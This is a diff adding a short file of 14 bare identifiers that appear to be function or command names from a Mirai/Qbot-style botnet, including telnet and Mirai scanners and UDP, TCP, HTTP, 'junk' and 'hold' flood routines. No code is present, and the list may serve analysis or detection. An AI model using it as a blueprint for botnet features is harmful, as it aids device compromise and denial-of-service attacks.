@@ -1,0 +1,14 @@
+main
+start
+processcmd
+startthelelz
+miraiscanner
+telnetscanner
+sendudp
+sendtcp
+sendjunk
+sendhold
+sendhttp
+sendcnc
+sendstd
+sendunknown
